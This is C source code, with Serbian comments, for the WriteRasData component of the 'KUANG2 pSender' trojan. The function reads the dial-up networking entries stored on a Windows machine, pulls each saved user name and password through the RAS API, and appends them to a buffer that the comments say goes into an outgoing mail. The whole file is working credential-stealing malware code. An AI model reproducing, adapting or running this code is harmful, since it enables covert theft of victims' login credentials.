/***[ThuNderSoft]*************************************************************
						  KUANG2 pSender: WriteRasData
								     WEIRD
*****************************************************************************/

#include <windows.h>
#include <ras.h>
#include <raserror.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

extern char buff[];		// ovde se dodaje ono što se šalje
extern char temp[];

/*
	WriteRasData
	------------
  + čita RasPodatke i njih snima u bafer. Ovi podaci su 100% sigurni, ako ih
	uopšte ima.	 Nema ih kada je isključeno 'Save Password'. */

BOOL WriteRasData(char *fb)
{
	RASENTRYNAME *rasko;				// ovde smesti ras entry-je (phone-books)
	RASDIALPARAMS rasdata;				// info o pojedinačnom DialUpu
	BOOL ispassget;						// da li je uzet password?
	DWORD entrysize;					// veličina ras entryja
	DWORD brojDUP;						// broj upisanih DUPova
	int rezultat;						// interna, smešta se rezultat f-ja
	int i;								// interni brojač
	int maxdups;						// ukupan broj dupova
	BOOL retval;
	char wME[]="\r\nwME";
	char eRE[10]="\r\neRE";
	char eRG[8]="\r\neRG";

	retval=FALSE;
	maxdups=entrysize=0;
	rezultat=RasEnumEntries(NULL, NULL, NULL, &entrysize, &brojDUP);
	maxdups=brojDUP;	// Sada maxdups daje tačan broj zapisa!

	entrysize=sizeof(RASENTRYNAME)*maxdups;			// ukupna veličina

	rasko=GlobalAlloc(GMEM_FIXED, entrysize);
	if (rasko==NULL) {
		straddF(buff, wME);
		return FALSE;			// izađi
	}
	rasko[0].dwSize=sizeof(RASENTRYNAME);	// Prvi entry mora da ima setovan
											// dwSize da bi radilo
	// prebroji mi dial-up ove
	rezultat = RasEnumEntries(NULL, NULL, &rasko[0], &entrysize, &brojDUP);

	if (rezultat == ERROR_BUFFER_TOO_SMALL) {
		straddF(buff, wME);
		GlobalFree(rasko);
		return FALSE;			// izađi pošto neće ništa pisati
	} else {
		if (rezultat) {
			straddF(buff, eRE);
			GlobalFree(rasko);
			return FALSE;		// systemska greška
		}
	}

	for (i=0; i<brojDUP; i++) {
		// prvo iskopiraj ime DUP
		strcopyF(rasdata.szEntryName, rasko[i].szEntryName);
		// obavezno za ispravan rad f-je
		rasdata.dwSize=sizeof(RASDIALPARAMS);
		// učini ono što moraš
		rezultat = RasGetEntryDialParams(NULL, &rasdata, &ispassget);
		if (rezultat)
			straddF(buff, eRG);
		else {
			// Nema greške, zapiši sve što me zanima: Entry/User/Pass
			strcopyFaddd(temp, rasdata.szUserName, 0x0A0D);
			straddFaddd(temp, rasdata.szPassword, 0x0A0D);

			if (!strfind(fb, temp)) {
				retval=TRUE;				// nije našao je podatke
				straddF(fb, temp);			// dodaj ih u fajl bafer

				if (i==0) straddF(buff, "-----\r\n");              // odvoji
				straddFaddd(buff, rasdata.szEntryName, 0x0A0D); // dodaj entry name
				straddFaddd(buff, temp, 0x0A0D);		// dodaj ih i u mail-bafer
			}
		}
	}

	GlobalFree(rasko);	// oslobodi raska da ide kući
	return retval;
}
